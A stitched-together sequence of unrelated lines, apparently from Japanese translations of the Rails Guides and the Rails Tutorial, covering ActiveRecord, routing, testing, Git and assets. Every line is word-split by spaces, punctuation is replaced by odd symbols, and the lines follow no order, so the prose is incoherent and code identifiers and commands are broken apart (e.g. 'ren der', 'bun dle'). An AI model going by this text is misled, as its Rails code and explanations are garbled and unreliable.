    #  変更 が 必要 :   form _ for は 、 存在 し な い PATCH ルート を 探 そ う と する
サンプル アプリケーション の   ( ほぼ )   静的 な ページ 。
*  `collection ( force_ reload   =  false ) `
リスト \ ref{ code :a_test _ for_ valid _ submis sion } の とき
その ため に は 、 Factory   Girl に 関連 付け を 作成 する 方法 を 知 っ て お く 必要 が あ り ま す 。
` beginning _ of_month ` は ` at_beginning _ of_month ` の 別名 、 ` end _of_month ` は ` at_end _of_month ` の 別名 で す 。
Active   Support は 、 インスタンス 変数 に 簡単 に アクセス する ため の メソッド を 多数 提供 し て い ま す 。
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Routing ` の 導入 に 伴 い ` Action Controller : : Routing ` が 非 推奨 と な り ま し た 。
\ kode { from _users _ followed_by } を 改良 する 。
話 を 戻 し て 、 Bootstrap の 変数 の 一覧 表 を 見 る と 、 薄 い 灰色 に 対 し て 以下 の 変数 名 が 与え られ る こと に 気 が 付 き ま す 。
`build_association ` メソッド は 、 関連 付け られ た 型 の 新し い オブジェクト を 返 し ま す 。
これ は リスト \ ref{ code : friendly _ forwarding _ test } で 使用 さ れ て い ま し た 。
上 の 例 で は ` require_ self ` が 使用 さ れ て い ま す 。
ルート URL に リダイレクト し て も よ い で す が 、 一般 的 な 慣習 に したが っ て 、 新し く 作成 さ れ た ユーザー の プロフィール ページ に リダイレクト し て み ま す 。
ここ まで 実行 すれ ば 、 以下 の よう に \ kode {rails   s } コマンド   ( \kode {rails server } コマンド の 短縮 版 )   を 実行 し て ローカル Web サーバー を 起動 でき る よう に な り ま す 。
アプリケーション コード 内 に あ る この ミドルウェア へ の 参照 は すべて 削除 する 必要 が あ り ま す の で 注意 が 必要 で す ▟ 例 ：
#### select
Spork は Guard と 併用 する と 非常 に 便利 で す ▟ 設定 を 行 う と 、 以下 の よう に コマンド 上 で 併用 する こと が でき ま す 。
( 実際 に は \ kode {rake } と タイプ する だけ で 済 み ま す ▟ \ kode {rake } の デフォルト の 動作 は テスト スイート の 実行 で す ) 。
class   Patient <  ActiveRecord : : Base  
( この 時点 で は )   データベース を 変更 し た く な い の で 、 コンソール を \emph { サンド ボックス } モード で 起動 し ま す 。
  </ head >
TIP:   この オプション を 使用 する の は 、 レスポンス の content type が どんな もの で あ っ て も よ い 場合 のみ に し て くださ い 。
単独 の 記事 は 表示 でき る よう に な り ま し た が 、 今度 は 記事 の 一覧 も 表示 でき る よう に し て み ま しょ う 。
  elsif options [ : counter_cache ]
`ren der ` メソッド は さまざま な 方法 で カスタマイズ でき ま す 。
この 方法 なら 指定 さ れ た タグ のみ が 許可 さ れ る ため 、 あらゆる 攻撃 方法 や 邪悪 な タグ に 対 し て フィルタ が 健全 に 機能 し ま す 。
特に 、 \ kode { params } は 以下 の よう な 入れ子 ハッシュ に な っ て い ま す ▟ ハッシュ の 中 に ハッシュ が あ る 構造 で す 。
create
` config ▖ assets▖digest ` も true に な っ て い る 場合 、 アセット へ の リクエスト に ダイジェスト を 含 む こと が 必須 と な り ま す 。
同様 に 、 他 の ヘッダー の 情報 も リスト \ ref{ code : header_ partial } の パーシャル に 移動 し 、 \ kode {ren der } を 呼び出 し て レイアウト に 挿入 する こと が でき ま す 。
##### `:status ` オプション
この メソッド の 動作 は ` attr_accessor ` や ` cattr_accessor ` など の 兄弟 メソッド と 似 て い ま す が 、 モジュール の ゲッター 名 と セッター 名 に 指定 さ れ た 名前 を 使用 し ま す 。
\ kode { do } キー ワード は 、  \kode { form\_ for } が 1 つ の 変数 を 持 つ ブロック を 取 る こと を 表 し ま す ▟ この 変数 \ kode { f } は   “ form ”   の f で す 。
完全 を 期 し て 、 今後 は チュートリアル の 最後 まで 基本 的 に 上 の 方法 を 使用 し て テスト を フル 実行 し ま す 。
この 時点 で 、 テスト は パス する はず で す 。
次 に ステータス フィード を RSS フィード する 機能 も 実装 し 、 余裕 が あ れ ば フィード に 認証 スキーム も 追加 し て アクセス を 制限 し て み て くださ い 。
route   " root  to :  ' people # index' "
$  git   push  origin   my _pull_request   - f
この モデル は 、 インターネット バンキング や 金融 取引 口座 など の 重要 な 情報 を 扱 う Web サイト に 向 い て い ま す 。
エンジン が 持 つ アセット は 、 ホスト 側 の アプリケーション で は 必ず しも 必要 で は な い こと が あ り ま す 。
上 を どう に か し て \emph { 変数 } と し て 扱 い た い の で す ▟ そこ で 以下 を 呼び出 す こと に し ま す 。
従 っ て 、 以下 の よう な require 文 を 実行 し た だけ で は
属性 を 更新 する もう ひと つ の 方法 は 、 \ kode {update_attributes } を 使 う もの で す
   def welcome_email ( user ,  email_body )
|   PATCH / PUT  | /sekret/ comments/: id ( ▖: format )          |  comments # update   |  comment_ path          |
ここ で は 、 `@ article ▖errors▖any ? ` で エラー が 発生 し て い る か どう か を チェック し て い ま す ▟ そして エラー の 場合 は `@ article ▖errors▖ full _messages ` で エラー メッセージ を 全文 表示 し ま す 。
Client▖select(:name ) ▖ distinct
一 重 引用 符 と 二 重 引用 符 が 既に 両方 使用 さ れ て い る の で 、 この ペイロード で は 引用 符 が 使用 でき ま せ ん 。
通常 、 これ は \emph {gem } の インストール に 関連 し ま す ▟ gem と は 自己 完結 型 の Ruby コード の パッケージ で す 。
この メソッド で は 、 ` assert_valid _keys ` を 使用 し た 制御 を 実装 し て い ま す 。
つまり 、 ` http://local host : 3000 / blorgh/articles ` に 移動 し な く て も ` http://local host : 3000 / blorgh ` に 移動 すれ ば 済 む と い う こと で す 。
本書 で は 今後 も この サンプル アプリケーション を 使 い 続け る の で 、 \ href {https://bitbucket▖org / repo/ create} { Bitbucket 上 に リポジトリ を 作成 し て プッシュ し て お く } と よ い で しょ う 。
    resources  : comments
テスト と サイト の 実装 を 結びつけ る 方法 の 例 は 他 に も 多数 あ り ま す 。
We’ll   learn  much   more  about  the   association   facilities in   Active   Record   in   Chapter   \ ref { cha :user_microposts}  and   Chapter   \ ref { cha : following _ users } ▖
使用 する ツール に つ い て
*   `offset`
バリデーション の 概要
JSON は Java Script の データ 形式 の 一種 で 、 多く の Ajax ライブラリ で 使用 さ れ て い ま す 。
` include ? ` の 逆 の 動作 で す 。
正し い データ だけ を データベース に 保存 する の で あ れ ば 、 モデル レベル で バリデーション を 実行 する の が 最適 で す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/slice ▖ rb ` で す 。
エンジン の ` app ` ディレクトリ の 中 に は 、 通常 の アプリケーション で お なじみ の 標準 の ` assets` 、 ` controllers` 、 `helpers` 、 `mailers` 、 ` models ` 、 ` views ` ディレクトリ が 置 か れ ま す 。
now  =  DateTime▖ current # =>  Mon ,   0 7   Jun  2010   19 : 27 : 52   - 0400
` Active   Record  Observer ` と ` Action   Controller   Sweeper ` は ` rails - observers`   gem に 切り出 さ れ ま し た 。
|   GET        | / magazines/: magazine _ id/ads/:id       |  ads # show           |  ある 雑誌 1 冊 に 含 ま れ る 広告 を 1 つ 表示 する                     |
Sprockets▖ register_engine  '▖ bang ' ,   BangBang : : Template
読者 の Niels   de   Ron から の ご 指摘 で し た ▟ ありがとう ござ い ま す 。
この コード は リスト \ ref{ code : post _ signup } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
この 場合 、 ` user ▖ save ` を 実行 し て 初めて データベース に レコード が コミット さ れ ま す 。
これ より コメント の 部分 に 適切 な コード を 追加 し ま す 。
リスク と 取扱い 上 の 注意 を 十分 理解 し て い る 場合 に 限 り 、 ` deep _munge ` を オフ に し て アプリケーション を 従来 の 動作 に 戻 す こと が でき ま す 。
何 人 か の 開発 者 は 「 1 つ の テスト に 複数 の アサーション を 入れ る べ き で は な い 」 と 強 く 主張 する で しょ う 。
#    id          :integer          not  null ,   primary  key
この ディレクトリ 内 で コントローラ や モデル 、 ビュー を 生成 し て アプリケーション を 拡張 し 、 続 い て これ ら を 使用 し て エンジン を テスト でき ま す 。
パスワード 再 設定 画面 へ の リンク を 追加 する
*   正し い コード を 書 く こと 。
本文 および リスト \ ref{ code :failed_ signin_attempt } の コメント で 述べ た よう に 、 この コード に は 誤り が あ り ま す 。
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Integration Test ` の 導入 に 伴 い ` Action Controller : : Integration Test ` は 非 推奨 と な り ま し た 。
使用 可能 な 長 さ 制限 オプション は 以下 の とおり で す 。
@account  = @ supplier▖build_account ( terms:   " Net   30 " )
バージョン 管理 システム を 熟知 する こと は 、 今 や あらゆる ソフトウェア 開発 者 に と っ て 必須 の スキル で あ る と 言 っ て よ い で しょ う 。
check _ box_ tag  ' accept'
この 場合 、 \ kode { production ▖rb } へ の 絶対 パス は 以下 の よう に な り ま す 。
     config▖ action _mailer▖ interceptors =  [ " MailInterceptor " ]
  timeout :  500 0
ヘルパー メソッド と カスタム RSpec マッチャー を 追加 する 。
ジェネレータ を 使用 し た く な い 場合 は 、 app/mailers ディレクトリ 以下 に ファイル を 作成 し 、 ` Action Mailer : : Base ` を 継承 し て くださ い 。
設定 を すべて の Rails コンポーネント に 渡 し た い 場合 は 、 ` config/application ▖rb ` 内 の 同じ ` config ` オブジェクト を 使用 し て 行な う こと が でき ま す 。
次 の 章 に 進 む 前 に 、 差分 を コミット し て master ブランチ に マージ し て お き ま しょ う 。
上 の コード は 以下 と 同等 で す 。
gem  'sass - rails ' ,    "~ >   3 ▖ 2 ▖ 3 "
User の デフォルト fixture 
TIP:  `select ` を ` belongs_to ` 関連 付け で 使用 する 場合 、 正し い 結果 を 得 る ため に ` : foreign_key ` オプション を 必ず 設定 し て くださ い 。
エンコード は UTF - 8 に 変え て くださ い 。
class   Server  < : : Rack : : Server
CD N は コンテンツ を キャッシュ する こと で 動作 し ま す 。
Deleted branch   modify - README   ( was   2 c 92 bef) ▖
    has_many : pictures ,   as : :imageable
\ kode {▖ gitignore } ファイル に \ kode {bun dler_stubs } を 追加 する 。
Content -Length :   126 5 6 0
これ の コマンド 全体 また は 一部 に ユーザー 入力 が 使用 さ れ る よう な こと が あ る 場合 、 特に 注意 が 必要 で す 。
  ``` ruby
` - n ` オプション を 指定 する と 、 ファイル 全体 で は な く 指定 し た 単一 の メソッド だけ を 実行 し ま す 。
` Array ` の 拡張
#### ` Time▖ current `
例 :  
\emph { Architectural   Styles  and   the   Design   of   Network - based   Software   Architectures }▖
     self ▖ author   =  User ▖find_or_create_by ( name :   author_ name )
カラム を この よう に 名付け る こと に よ っ て 、 Active   Record で User オブジェクト の 属性 を 利用 でき る よう に な り ま す 。
原因 は 、 edit アクション や update アクション で ログ イン を 要求 する よう に な っ た ため 、 ログ イン し て い な い ユーザー だ と これ ら の テスト が 失敗 する よう に な っ た ため で す 。
恐ろし く 大きな アップロード 画像
数値 を 通貨 表示 に 変換 し ま す   ( $ 13 ▖ 65 など ) 。
╼ *= require_ self
` : inverse _of ` オプション は 、 その 関連 付け の 逆 関連 付け と な る ` belongs_to ` 関連 付け の 名前 を 指定 し ま す 。
\ kode {User ▖ new } を 引数 なし で 呼 ん だ 場合 は 、 すべて の 属性 が \ kode {nil } の オブジェクト を 返 し ま す 。
#  def  debug ?
` orders_count ` を 指定 し な い で 新し い ` Client ` モデル を 作成 し よう と する と 、 レコード は 無効 に な っ て 例外 が 発生 し ま す 。
\ kode {rake   test } コマンド は 、 テスト を する 度 に コマンドライン に 移動 し て 手動 で コマンド を 実行 し な けれ ば な ら な い 点 が 面倒 で す 。
エラー メッセージ を テスト する ため の テンプレート
あるいは 、 ` raw ` と 同等 の `<%= = ` を 使用 し ま す 。
years_ since
class   Continent <  ActiveRecord : : Base
` video_tag ` ヘルパー は 、 指定 さ れ た ファイル を 指 す HTML   5   `< video> ` タグ を 生成 し ま す 。
Key  : success  has  value   " It   worked ! "
" User " ▖ foreign_key           # =>  " user_ id "
この ` to_s ` メソッド は 、 ` to _ formatted_s ` メソッド の 別名 で す 。
" hello " ▖ from ( 2 )    # => " llo "
本 ガイド の コード 例 で は 、 基本 的 に 以下 の モデル を 使用 し ま す 。
これ は リスト \ ref{ code :find_authenticate_user } で 使用 さ れ て い ま し た 。
{ 0 } 図 7 ▖ 11 { / 0 } { 1 } ユーザー 登録 ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signup _mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
<b >Users</ b >
Ruby で は 組み込 み クラス で すら 内部 を 見 たり 修正 し たり でき る
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Response ` の 導入 に 伴 い ` Action Controller : : Response ` が 非 推奨 と な り ま し た 。
  >>  Rails ▖env▖ development ?
` beginning _ of_ year ` メソッド と ` end _of_ year ` メソッド は 、 その 年 の 最初 の 日 と 最後 の 日 を それぞれ 返 し ま す 。
>> p =   Person ▖ new
new で 既に 行 っ た の と 同じ 要領 で 、 ` app/controllers/articles_controller▖ rb ` に ` show ` アクション を 追加 し 、 対応 する ビュー も 追加 する 必要 が あ り ま す 。
カスタマイズ し た \ kode { Guardfile } ▖
` : host ` オプション を グローバル に 設定 し て い な い 場合 は 、 "*_url"   ヘルパー に ` : host ` オプション を 明示 的 に 渡 す 必要 が あ る こと に ご 注意 くださ い 。
例外 発生 部分 を 削除 する  
  enable_starttls_auto :  true    }
説明 の リスト
実質 的 に 空 に な っ て い る デフォルト の User   spec 。
したが っ て 、 Users コントローラ の テスト   ( リスト \ ref{ code :edit _update_redirect_tests} )   を 補完 する よう に 、 テスト を 追加 する ところ から 始め て い き ま す 。
*   アセット パイプライン に プリ プロセッサ を 追加 する
    <td ><%=   link_to   " Show " ,   book  %></td>
    has_many  : accounts
7 ▖ to_ param  # =>  " 7 "
$  bin/rails   generate  job  guests_ cleanup
ステータス フィード の パーシャル は 、 Micropost の パーシャル   ( リスト \ ref{ code :micropost _ partial } )   と は 異な っ て い る 点 に 注目 し て くださ い 。
{ 0 } { 1 } リスト 3 ▖ 28 { / 1 } { / 0 } は 、 \emph { ERB } と 呼 ば れ て い る 、 Ruby の 埋め込 み コード の 最初 の 例 で す
ユーザー が 記憶 さ れ る に は ログ イン が 必要 で す ▟ そこ で 、 テスト 内 で ユーザー が ログ イン でき る よう に する ため の ヘルパー メソッド を 定義 する こと から 始め ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/inclusion ▖rb ` で す 。
変更 の 結果 を リスト \ ref{ code :edit _update_redirect_tests } に 示 し ま す 。
       define _method ( method_ name , &block )
- -   create_table(:articles )
その 後 、 その リソース に 対応 する 行 が ` config/ routes▖rb ` ファイル に 挿入 さ れ 、 エンジン で 使用 さ れ ま す 。
( 2 * * 1024 ) ▖ clone   # => allocator  undefined   for   Bignum
気 に な る 方 へ の 補足 :  find を 使用 する 場合 は 以下 の よう に な り ま す 。
#### `prepend `
キュー へ の ジョブ 登録 は 以下 の よう に 行 い ま す 。
メイラー も コントローラ の ビュー と 同様 の 方法 で レイアウト を 設定 でき ま す 。
belongs_to  : author ,   class_ name : Blorgh ▖ author_ class▖ to_s
\ kode {@users } 変数 に ユーザー 一覧 が 保存 さ れ る と 、 コントローラ は リスト \ ref{ code : demo_ index_ view} の  \emph { ビュー }   を 呼び出 し ま す   ( ⑥ ) 。
以上 で お しまい で す 。
今回 の 記事 と コメント と い う モデル の 場合 、 以下 の いずれ か の 方法 で 関連 付け を 設定 でき ま す 。
####  javascript_ include_tag
それ で は 、 まず \ kode {rails  console } コマンド を 実行 し て セッション を 開始 し 、 次 に 有効 な 名前 ・ メール アドレス ・ パスワード ・ パスワード 確認 を 渡 し て ユーザー を 作成 し て み ま しょ う 。
リスト \ ref{ code : users _ resource } の Users リソース が 提供 する RESTful な ルート
えっ ? !
Rails   4 で ` PUT ` リクエスト を ` / users/:id ` に 送信 する と 、 従来 と 同様 ` update ` に ルーティング さ れ ま す 。
ユーザー が リダイレクト さ れ た 後 で 、 アプリケーション が この id で リレーションシップ を 取り出 す の で 、 この コード は 動作 し ま す 。
it ▖ ╼╼    \ subsection { 開発 環境 } ╼    \ label{ sec : development_environment} ╼╼
` form _ for ` の 場合 と 同様 、 同じ Ajax イベント を バインド でき ま す 。
*   Rack の ミドルウェア を Rails で 使 う 方法
2 番 目 の 例 で は 2 つ 目 の Location ヘッダー フィールド が 1 つ 目 の もの を 上書き する ため 、 以下 の よう な HTTP ヘッダー が 生成 さ れ ま す 。
$  echo  " + : to_ param + "  | rdoc -- pipe
###  サブ クラス と 子孫
Git に 取り込 み た く な い ファイル を 指定 する ため の パターン
以下 の メソッド が 用意 さ れ て い ま す 。
続 い て 、 自分 の システム に Heroku コマンドライン クライアント が インストール さ れ て い る か どう か を 確認 し ま す 。
最新 の Sublime  Text は 、 新しもの 好き の 方 以外 に は お 勧め し ま せ ん 。
メイラー の テスト と 統合 テスト は 、 どちら も User メイラー の 振舞い を 確認 する の に 有用 。
後者 を 指定 する と 、 冒頭 が 小 文字 に な り ま す 。
なお 、 同じ カテゴリー に 複数 の 記事 が あ る 場合 、 カテゴリー が 重複 し ま す 。
SELECT  *  FROM   clients  ORDER   BY  clients ▖ id   DESC   LIMIT   3
以下 の よう に する と 、 特定 の キュー に 対 し て ジョブ を 1 つ 作成 でき ま す 。
      invoke   erb
サイン イン に 成功 後 表示 さ れ る ユーザー ・ プロファイル の モックアップ ▟  \ href { http://railstutorial ▖org / images/figures/signin_success_mockup_bootstrap - full ▖ png } { ( 拡大 表示 ) }
# =>  Sun ,   29   Mar  2010
*  `config ▖filter_ parameters ` は 、 パスワード や クレジット カード 番号 など 、 ログ に 出力 し た く な い パラメータ を フィルタ で 除外 する ため に 使用 し ま す 。
       create      app/assets/stylesheets/users ▖css ▖ scss
production モード の 場合 、 この コール バック は 最初 の リクエスト で のみ 実行 さ れ ま す 。
これ は リスト \ ref{ code :relationships_controller_ spec _ajax } で 使用 さ れ て い ま し た 。
たとえば 、 ` config/application ▖rb ` ファイル に は 以下 の 設定 が 含 ま れ て い ま す 。
###  プリ プロセス
作成 し た 関連 付け に も よ り ま す が 、 具体 的 に は 次 の 2 つ の 作業 が 必要 に な り ま す 。
続 い て ` bun dle ` コマンド を 実行 し 、 gem を インストール し ま す 。
これ は リスト \ ref{ code : password _ reset_mailer_test } で 使用 さ れ て い ま し た 。
cookie セッション ストア を 使用 する 場合 、 ` session ` や ` flash ` ハッシュ に つ い て も この こと は 該当 し ま す 。
   def  to_ param
    <td ><%=  book▖title %></td>
javascript_ path  " common "  # => /assets/ common ▖ js
指定 の 属性 に 関 する すべて の エラー メッセージ の 文字 列 の 配列 を 返 し ま す ▟ 1 つ の 文字 列 が 1 つ の エラー メッセージ で す 。
この とき ITU は 、 混乱 を 最小 限 に とどめ る ため に 、 略称 を 1 つ だけ に し た い と 考え ま し た 。
####  form _ for
この メソッド で 使用 さ れ る 文法 は 、 ` ActiveRecord : : Base ▖find ` で 使用 さ れ て い る もの と 同じ で す 。
一般 に 、 Rails の 設定 作業 と は Rails 自身 を 設定 する こと で も あ る と 同時 に 、 Rails の コンポーネント を 設定 する こと で も あ り ま す 。
   match  '/' => 'root # index'
もちろん 、 以下 の よう に リンク を 直接 記述 する こと も でき ま す 。
   Myapp :: Application ▖ config▖ secret_key_ base  = 'new  secret  key  base'
# => {" A " = > 2 }
self を 省略 し た 結果 を リスト \ ref{ code : layout_ login_logout_links } に 示 し ま す 。
     w here ( published:  true )
      t▖ string     : account_number
同じ マシン 上 で 異な る バージョン の Ruby や Rails を 実行 し た い 場合 、 これ は 特に 重要 で す 。
http://www ▖example ▖ com/account_activations/q5lt 38hQDc_ 959 PVoo6 b 7 A/edit
|                     |   402                | : payment_required                 |
特徴 :
*   制限 追加 や Rack エンド ポイント など の 高度 な 手法
###  ルーティング の 作成 を 制限 する
Rails に は 初期 化 コード の 置き 場所 が 4 箇所 あ り ま す 。
<%=   link_to   " Blog   articles " , blorgh ▖ articles_ path %>
####  form_tag
` require_tree ` ディレクティブ を 使用 する と 、 これ ら の ファイル を 即座 に アプリケーション から 利用 でき ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
たとえば 、 \ ref{ sec : ren dering _ with _a_flash_message } で は \ kode {flash [ :error ] } を 使用 し て ログ イン に 失敗 し た こと を 表 す メッセージ を 表示 し ま す
Home ページ で 動作 する ステータス フィード ▟ \ href { http://railstutorial ▖org / images/figures/home_ page_with _feed_bootstrap - full ▖ png } { ( 拡大 ) }
  ( Linux 用 の GitHub は 今 の ところ Git しか な い よう で す ) 。
# Uncomment  this   line   on   OS   X ▖
# ==   Mock   Framework
Rails で は 、 ある ページ から 別 の ページ に 移動 する とき に 状態 を 保持 する こと が でき ま す ▟ ページ の 状態 の 保存 に は 、 一時 cookies と 永続 cookies の どちら も 使用 でき ま す 。
##### ` readonly`
図 { p 0 } の モックアップ で 示 し た よう な 、 ユーザー 自身 の ポスト を 含 む マイクロ ポスト の { 2 } フィード { / 2 } が な い と 不便 で す
そこ で 、 コントローラ で 渡 さ れ る パラメータ は ホワイト リスト で チェック し 、 不正 な マス アサインメント を 防止 する 必要 が あ る の で す 。
   def  foo╼      do _stuff ╼    boolean ?   ?
lib/assets/javascripts/moovinator ▖ js
The   association   between  microposts  and   users ▖
<%=  text _field  : person ,  :email   %>
Calling   ` protect _ from _ forgery ` を 呼び出 す と 、 デフォルト で ` : authenticity _ token ` が 設定 さ れ ま す 。
利用 可能 な すべて の メソッド に つ い て は 、 ` ActiveModel : : Errors ` ドキュメント を 参照 し て くださ い 。
Active   Record は 条件 値 の 最初 の 要素 を 調べ 、 その 後 に 要素 が 追加 さ れ て い た ら 、 最初 の 要素 の 中 に あ る 疑問 符 ` ( ? ) ` を 追加 要素 で 置き換え ま す 。
       subject :  email ▖ subject ,
####  バック ポート
*  `config ▖ assets▖ logger ` は ロガー を 引数 に 取 り ま す ▟ この ロガー は 、 Log 4 の インターフェイス か 、 Ruby の ` Logger ` クラス に 従 い ま す 。
    Contact   Ruby   on   Rails   Tutorial  about  the   sample  app  at  the
たとえば 、 ローカル 変数 名 を ` product ` で は な く ` item ` に し た い の で あ れ ば 、 以下 の よう に し ま す 。
# => Blog :   Visit ▖
d   +   1 ▖ year
しかし 、 複雑 な 変更 を 行 っ て い た 場合 や 、 master と 対象 ブランチ の 差 が 甚だし く な っ て い る 場合 は 、 もう 少し 手 を 加え る 必要 が あ る か も しれ ま せ ん 。
` : skip_types ` オプション が true で な い   ( また は ` : skip_types ` オプション が な い )   場合 、 以下 の よう な マッピング で " type " 属性 も 追加 さ れ ま す 。
第 3 引数 は オプション ハッシュ で 、 この 場合 は サンプル アプリ の リンク で CSS の id   \kode { logo } を 指定 し て い ま す
User モデル オブジェクト を シミュレート する ため の ファクトリー 。
  <%=   f ▖ submit   %>
/* ▖▖▖
/* universal */
*   modify - README
上 で 述べ た よう に 、 \ kode { git  branch   - D } で トピック ブランチ 上 の 変更 を 破棄 する こと も でき ま す 。
mv   < 移動 元 / 現在 の 名前 >   < 移動 先 / 変更 後 の 名前 >
CAUTION :   データベース 上 の オブジェクト の 状態 を 変え る 方法 は 1 つ と は 限 り ま せ ん 。
ActiveSupport ▖ on_load(:active_ record )   do
リスト \ ref{ code : test _helper_application_helper } で お 見せ し た よう に 、 Application ヘルパー で 使 っ て い る \ kode { full \_title}   ヘルパー を 、 test 環境 で も 使え る よう に する と 便利 で す 。
`find_or_create_by ` および ` find_or_create_by ! ` メソッド を 使用 すれ ば これ ら を 一 度 に 行な う こと が でき ま す 。
    ren der   'new'
` descendants ` メソッド は 、 その レシーバ より 下位 に あ る すべて の クラス を 返 し ま す 。
` Action Mailer : : MessageDelivery ` オブジェクト は 、 ` Mail : : Message ` を ラップ し て い ま す 。
たとえば 、 ` Action Controller : : HttpAuthentication : : Token : : ControllerMethods ` に あ る 以下 の メソッド で は ` blank ? ` を 使用 し て トークン が 存在 し て い る か どう か を チェック し て い ま す 。
本 ガイド で 後述 する よう に 、 アセット ファイル を グループ 化 する 方法 は 自由 に カスタマイズ でき ま す 。
| `{  " person " :  null }`              | `{ : person  => nil  }`     |
マイクロ ポスト 用 の アクセス 制御 テスト 。
X ▖ local _ constants    # => [ : X 1 , : X 2 ,  : Y ]
` auto_discovery _ link_tag ` で は 以下 の 3 つ の タグ オプション が 使用 でき ま す 。
\ ref{ sec : requiring _ signed_ in_users } で 経験 し て き た よう に 、 Users コントローラ を テスト する ため に 、 アクション 単位 で アクセス 制御 を テスト し ま す 。
これ で すべて の 存在 性 が チェック さ れ た の で 、 テスト スイート は   \ passing   する はず で す 。
{ 0 } 図 2 ▖ 5   { / 0 } { 1 } 新規 ユーザー 作成 ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users/new}{/ users/new}) { / 1 }
プロフィール 画面   ( \ href { http://local host : 3000 / users /5 }{ / users /5 } )   に   [ Unfollow ]   ボタン が 表示 さ れ て い る
常 に 自動 化 テスト を 使用 し て 新 機能 開発 を 進め る こと で 、 自信 を 持 っ て リファクタリング でき る よう に な り 、 回帰 バグ も いちはやく キャッチ でき る よう に な る 。
* ` ActionDispatch : : Callbacks ` は 、 リクエスト に 応答 する 前 に 、 事前 コール バック を 実行 し ま す 。
その よう な 式 は 、 レシーバ の コンテキスト で 評価 さ れ ま す 。
以上 で 、 Rails アプリケーション を 初めて 作 る と い う 試み は 終わり で す ▟ この 後 は 自由 に 更新 し たり 実験 を 重ね たり でき ま す 。
    * `: domain` -  HELO ドメイン の 指定 が 必要 な 場合 に 使用 し ま す 。
今度 は 編集 フォーム が 動作 する よう に し ま しょ う 。
#  config/initializers/json_patch ▖ rb   に 以下 を 書 く
パーシャル 内 の ローカル 変数 を カスタマイズ し た い 場合 は 、 パーシャル の 呼び出 し 時 に ` : as ` オプション を 指定 し ま す 。
いつ も の よう に 、 統合 テスト を 生成 する ところ から 始め ま す 。
* `: through `
    resources  : books
この ガイド で は 、 開発 者 に 向け て Rails の ルーティング 機能 を 解説 し ま す   ( 訳注 :   route と root を 区別 する ため 、 訳 文 で は route を 基本 的 に 「 ルーティング 」 と 訳 し ま す ) 。
( 必要 に 応 じ て インデント 付き の コード 例 を 追加 でき ま す )
= = = = = = = = = = = = = = = = = =
この 項 で は 、 User と Micropost の 関連 付け を 改良 し て い き ま す 。
また 、 Rails コア チーム は 、 _edge  Rails_  ( その 時点 で の 開発 版 Rails の コード )   で の テスト に 時間 を 割 い て くれ る 方 から の フィードバック を 常 に 歓迎 し て い ま す 。
以下 の よう な 定形 の 手法 を 使用 する こと で 、 デフォルト 値 を 持 つ オプション ハッシュ を コンパクト に サポート でき ま す 。
* `: two_words_connector ` :   項目 数 が 2 つ の 場合 の 接続 詞 を 指定 し ま す 。
new_ password _ reset_path
メール 送信 の ため の Active   Mailer アクション や ビュー の 生成 機能 が Rails に 備わ っ て い る 。
この 結果 、 一意 性 の 検証 が 行 わ れ て い る に も かかわ ら ず 、 同じ メール アドレス を 持 つ 2 つ の ユーザー レコード が 作成 さ れ て しま い ま す 。
Web アプリケーション 用 の データ モデル を 構築 する に あた っ て 、 個々 の モデル 間 で の \emph { 関連 付け } を 十分 考え て お く こと が 重要 で す 。
個人 的 に は 、 コンセプト を 明確 に する 意味 と ユーザー 登録 ページ を ダブル チェック する 意味 も 兼ね て 、   ( 実際 の 手順 に 倣 っ て )   両方 の 関数 を 呼び出 す 方 が 好き で す 。
これ は 控えめ に 言 っ て も とても よく まとま っ て い ま す   ( リスト \ ref{ code : raw _user_ model } )
  </tr>
パラメータ
\ kode {self } を 明示 的 に 書 く か どう か は 好み の 問題 で す 。
create       test/fixtures/blorgh/ comments▖yml
   belongs_to  : manager ,   class_ name :  " Employee "
git  : init
また 、 ` deep_symbolize_keys` や ` deep_symbolize_keys ! ` を 使用 し て 、 与え られ た ハッシュ の すべて の キー と 、 その 中 に ネスト さ れ て い る すべて の ハッシュ の キー を シンボル に 変換 する こと も でき ま す 。
この ワーム は 、 攻撃 者 で あ る Samy の プロファイル ページ を 開 く だけ で 自動 的 に Samy に 友達 リクエスト を 送信 する と い う もの で す 。
これ ら の 要素 を 盛り込 ん だ StaticPages コントローラ 生成 コマンド と 実行 結果 を リスト \ ref{ code : generating _ pages } に 示 し ま す 。
    some_code
   def  article _params
基本 的 に は 、 Gemfile で エンジン を 指定 する 方法 は 他 の gem の 指定 方法 と 変わ り ま せ ん 。
###  引数 を 渡 す
$ bun dle   exec   rake   test : mailers
最後 に 、 作者 名 を 記事 の ページ に 表示 し ま しょ う 。
Twitter で は 、 マイクロ ポスト の 入力 時 に 最初 に   “ d ”   キー を 押 す と ダイレクト   ( プライベート )   メッセージ を 行え る 機能 が サポート さ れ て い ま す 。
     trashable▖ cleanup ( depth)
Cucumber の フィーチャー ファイル は 、 以下 の よう に その 機能 の 簡単 な 説明 から 始ま り ま す 。
フォーム を 再 送信 し て み る と 、 今度 は mis sing   template エラー が 表示 さ れ な く な り ま し た 。
    mod _ name  =   path▖ deconstantize
" alice   in   wonderland " ▖titleize # => " Alice   In   Won derland "
この 宣言 に よ っ て 、 ` Products Controller ` から の 出力 で 使用 さ れ る レイアウト は ` app/views/layouts/inventory ▖html ▖erb ` に な り ま す 。
したが っ て 今回 は 、 正し い 数 が 表示 さ れ て い る か どう か と 、 正し い URL が 表示 さ れ て い る か どう か の 2 つ の テスト を 書 き ま す 。
たとえば 、 アプリケーション の admin セクション で 使用 する JS ファイル と CSS ファイル を ` admin ▖css ` と ` admin ▖ js` マニフェスト に それぞれ 記載 する こと が でき ま す 。
     constraints:   lambda { |request |   Blacklist ▖ retrieve_ ips▖include ? (
\ ref{ sec : deleting _ users } で 書 い た よう に 、 サイト 管理 者 は ユーザー を \emph { 破棄 する } 権限 を 持 ち ま す 。
# = >   100 ▖ 0 00 %
